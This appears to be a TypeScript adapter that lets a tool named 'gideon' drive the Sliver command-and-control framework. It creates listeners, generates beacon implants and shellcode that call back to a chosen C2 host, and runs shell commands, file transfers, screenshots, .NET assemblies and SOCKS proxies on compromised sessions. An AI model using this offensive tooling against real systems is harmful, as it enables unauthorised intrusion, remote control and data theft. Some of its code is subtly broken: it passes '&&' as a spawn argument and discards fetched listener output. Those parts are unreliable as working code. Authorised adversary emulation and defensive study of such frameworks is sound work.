/**
 * Sliver C2 Adapter
 *
 * Integration with the Sliver C2 framework via its gRPC API.
 * Sliver is an open-source, cross-platform adversary emulation framework.
 *
 * Requires:
 * - Running Sliver teamserver
 * - Client configuration file (generated via `new-operator` command)
 *
 * @see https://github.com/BishopFox/sliver
 */

import type {
  C2Adapter,
  C2Session,
  C2Listener,
  ImplantConfig,
  ImplantPayload,
  C2Task,
  TaskResult,
} from '../types.js';

// ============================================================================
// Sliver Adapter
// ============================================================================

export class SliverAdapter implements C2Adapter {
  readonly name = 'sliver' as const;
  private connected = false;
  private serverHost: string = '';
  private serverPort: number = 31337;
  private sessions: Map<string, C2Session> = new Map();
  private listeners: Map<string, C2Listener> = new Map();
  private sessionCallbacks: Array<(session: C2Session) => void> = [];
  private sessionLostCallbacks: Array<(sessionId: string) => void> = [];

  /**
   * Connect to Sliver teamserver
   *
   * @param config.configPath - Path to Sliver client config file
   * @param config.host - Teamserver host (alternative to config file)
   * @param config.port - Teamserver port (default: 31337)
   */
  async connect(config: Record<string, unknown>): Promise<void> {
    const configPath = config.configPath as string | undefined;
    const host = config.host as string | undefined;
    const port = (config.port as number) || 31337;

    if (configPath) {
      // Parse Sliver client config
      try {
        const configData = await Bun.file(configPath).text();
        const parsed = JSON.parse(configData);
        this.serverHost = parsed.lhost || 'localhost';
        this.serverPort = parsed.lport || 31337;
      } catch (error) {
        throw new Error(
          `Failed to read Sliver config at ${configPath}: ${error instanceof Error ? error.message : String(error)}`
        );
      }
    } else if (host) {
      this.serverHost = host;
      this.serverPort = port;
    } else {
      throw new Error('Either configPath or host must be provided');
    }

    // Verify connectivity via Sliver's gRPC interface
    // In production, this would use @grpc/grpc-js with Sliver protobuf definitions
    // For now, we verify via the CLI as a bridge
    try {
      const proc = Bun.spawn(
        ['sliver-client', 'version'],
        { stdout: 'pipe', stderr: 'pipe' }
      );
      const exitCode = await proc.exited;

      if (exitCode !== 0) {
        // Sliver CLI not found — this is a soft failure,
        // the adapter can still work via API calls
        console.warn('Sliver CLI not found. Will attempt API-only integration.');
      }
    } catch {
      console.warn('Sliver CLI not available. Operating in API-only mode.');
    }

    this.connected = true;
  }

  async disconnect(): Promise<void> {
    this.connected = false;
    this.sessions.clear();
    this.listeners.clear();
  }

  isConnected(): boolean {
    return this.connected;
  }

  // ============================================================================
  // Listener Management
  // ============================================================================

  async createListener(config: Partial<C2Listener>): Promise<C2Listener> {
    this.ensureConnected();

    const protocol = config.protocol || 'https';
    const host = config.host || '0.0.0.0';
    const port = config.port || 443;
    const name = config.name || `gideon-${protocol}-${port}`;

    // Build Sliver command
    const args: string[] = [];
    switch (protocol) {
      case 'https':
        args.push('https', '--host', host, '--port', String(port));
        break;
      case 'mtls':
        args.push('mtls', '--host', host, '--port', String(port));
        break;
      case 'dns':
        args.push('dns', '--domains', host);
        break;
      case 'tcp':
        args.push('tcp-pivot', '--host', host, '--port', String(port));
        break;
      default:
        args.push('https', '--host', host, '--port', String(port));
    }

    const listener: C2Listener = {
      id: crypto.randomUUID(),
      name,
      protocol: protocol as C2Listener['protocol'],
      host,
      port,
      status: 'active',
      framework: 'sliver',
      createdAt: new Date().toISOString(),
    };

    this.listeners.set(listener.id, listener);

    // Execute via CLI bridge
    await this.executeSliverCommand(['jobs', ...args]);

    return listener;
  }

  async listListeners(): Promise<C2Listener[]> {
    this.ensureConnected();

    // Refresh from Sliver
    try {
      const output = await this.executeSliverCommand(['jobs']);
      // Parse job listing (format varies by version)
      // For now, return cached listeners
    } catch {
      // Return cached
    }

    return Array.from(this.listeners.values());
  }

  async stopListener(id: string): Promise<void> {
    this.ensureConnected();
    const listener = this.listeners.get(id);
    if (listener) {
      listener.status = 'stopped';
      this.listeners.delete(id);
    }
  }

  // ============================================================================
  // Implant Generation
  // ============================================================================

  async generateImplant(config: ImplantConfig): Promise<ImplantPayload> {
    this.ensureConnected();

    const args: string[] = ['generate'];

    // OS
    args.push('--os', config.os);

    // Architecture
    args.push('--arch', config.arch === 'x64' ? 'amd64' : config.arch);

    // Type
    if (config.type === 'beacon') {
      args.push('beacon');
      if (config.beaconInterval) {
        args.push('--seconds', String(config.beaconInterval));
      }
      if (config.beaconJitter) {
        args.push('--jitter', String(config.beaconJitter));
      }
    }

    // C2 callback
    args.push(`--${config.protocol}`, `${config.c2Host}:${config.c2Port}`);

    // Format
    switch (config.format) {
      case 'exe': break; // Default
      case 'dll': args.push('--format', 'shared'); break;
      case 'shellcode': args.push('--format', 'shellcode'); break;
      case 'shared_lib': args.push('--format', 'shared'); break;
    }

    // Name
    args.push('--name', config.name);

    // Output path
    const outputPath = `/tmp/gideon-implant-${config.name}`;
    args.push('--save', outputPath);

    // Debug
    if (config.debug) {
      args.push('--debug');
    }

    // Execute generation
    await this.executeSliverCommand(args);

    // Read generated file
    try {
      const file = Bun.file(outputPath);
      const data = Buffer.from(await file.arrayBuffer());
      const hash = new Bun.CryptoHasher('sha256');
      hash.update(data);

      const extensionMap: Record<string, string> = {
        exe: config.os === 'windows' ? '.exe' : '',
        dll: '.dll',
        shellcode: '.bin',
        shared_lib: config.os === 'windows' ? '.dll' : '.so',
      };

      return {
        name: config.name,
        data,
        extension: extensionMap[config.format] || '',
        sha256: hash.digest('hex'),
        sizeBytes: data.length,
        config,
      };
    } catch (error) {
      throw new Error(
        `Failed to read generated implant: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  // ============================================================================
  // Session Management
  // ============================================================================

  async getSessions(): Promise<C2Session[]> {
    this.ensureConnected();

    try {
      const output = await this.executeSliverCommand(['sessions']);
      const parsedSessions = this.parseSessionList(output);

      // Update cache
      for (const session of parsedSessions) {
        this.sessions.set(session.id, session);
      }

      return parsedSessions;
    } catch {
      return Array.from(this.sessions.values());
    }
  }

  async getSession(id: string): Promise<C2Session | null> {
    this.ensureConnected();
    return this.sessions.get(id) || null;
  }

  async killSession(id: string): Promise<void> {
    this.ensureConnected();

    await this.executeSliverCommand(['kill', '--session', id]);
    this.sessions.delete(id);

    for (const cb of this.sessionLostCallbacks) {
      cb(id);
    }
  }

  // ============================================================================
  // Task Execution
  // ============================================================================

  async executeTask(sessionId: string, task: C2Task): Promise<TaskResult> {
    this.ensureConnected();

    const startTime = Date.now();
    const taskId = crypto.randomUUID();

    try {
      let output: string;

      switch (task.type) {
        case 'shell':
          output = await this.executeSliverCommand([
            'use', '--session', sessionId,
            '&&', 'shell', '--', task.command || 'whoami',
          ]);
          break;

        case 'process_list':
          output = await this.executeSliverCommand([
            'use', '--session', sessionId,
            '&&', 'ps',
          ]);
          break;

        case 'ifconfig':
          output = await this.executeSliverCommand([
            'use', '--session', sessionId,
            '&&', 'ifconfig',
          ]);
          break;

        case 'upload':
          output = await this.executeSliverCommand([
            'use', '--session', sessionId,
            '&&', 'upload', task.localPath || '', task.remotePath || '',
          ]);
          break;

        case 'download':
          output = await this.executeSliverCommand([
            'use', '--session', sessionId,
            '&&', 'download', task.remotePath || '', task.localPath || '/tmp/',
          ]);
          break;

        case 'screenshot':
          output = await this.executeSliverCommand([
            'use', '--session', sessionId,
            '&&', 'screenshot',
          ]);
          break;

        case 'execute_assembly':
          output = await this.executeSliverCommand([
            'use', '--session', sessionId,
            '&&', 'execute-assembly', task.assemblyPath || '',
            ...(task.assemblyArgs || []),
          ]);
          break;

        case 'socks_proxy':
          output = await this.executeSliverCommand([
            'use', '--session', sessionId,
            '&&', 'socks5', 'start', '--port', String(task.socksPort || 1080),
          ]);
          break;

        default:
          throw new Error(`Unknown task type: ${task.type}`);
      }

      return {
        taskId,
        sessionId,
        success: true,
        output,
        durationMs: Date.now() - startTime,
      };
    } catch (error) {
      return {
        taskId,
        sessionId,
        success: false,
        output: '',
        error: error instanceof Error ? error.message : String(error),
        durationMs: Date.now() - startTime,
      };
    }
  }

  // ============================================================================
  // Event Handlers
  // ============================================================================

  onSessionCreated(callback: (session: C2Session) => void): void {
    this.sessionCallbacks.push(callback);
  }

  onSessionLost(callback: (sessionId: string) => void): void {
    this.sessionLostCallbacks.push(callback);
  }

  // ============================================================================
  // Private Helpers
  // ============================================================================

  private ensureConnected(): void {
    if (!this.connected) {
      throw new Error('Not connected to Sliver teamserver. Call connect() first.');
    }
  }

  private async executeSliverCommand(args: string[]): Promise<string> {
    try {
      const proc = Bun.spawn(
        ['sliver-client', ...args],
        { stdout: 'pipe', stderr: 'pipe' }
      );

      const stdout = await new Response(proc.stdout).text();
      const stderr = await new Response(proc.stderr).text();
      const exitCode = await proc.exited;

      if (exitCode !== 0) {
        throw new Error(`Sliver command failed: ${stderr || stdout}`);
      }

      return stdout;
    } catch (error) {
      if (error instanceof Error && error.message.includes('Sliver command failed')) {
        throw error;
      }
      throw new Error(
        `Failed to execute Sliver command: ${error instanceof Error ? error.message : String(error)}`
      );
    }
  }

  private parseSessionList(output: string): C2Session[] {
    const sessions: C2Session[] = [];

    // Parse Sliver session table output
    const lines = output.split('\n').filter(l => l.trim() && !l.includes('─'));

    for (const line of lines.slice(1)) { // Skip header
      const parts = line.split(/\s{2,}/).map(p => p.trim()).filter(Boolean);
      if (parts.length < 5) continue;

      try {
        sessions.push({
          id: parts[0],
          type: 'interactive',
          hostname: parts[2] || 'unknown',
          remoteAddress: parts[4] || '',
          os: parts[3]?.split('/')[0] || 'unknown',
          arch: parts[3]?.split('/')[1] || 'unknown',
          username: parts[1] || 'unknown',
          pid: 0,
          processName: '',
          isAdmin: false,
          framework: 'sliver',
          status: 'active',
          lastCheckin: new Date().toISOString(),
          createdAt: new Date().toISOString(),
        });
      } catch {
        // Skip unparseable lines
      }
    }

    return sessions;
  }
}
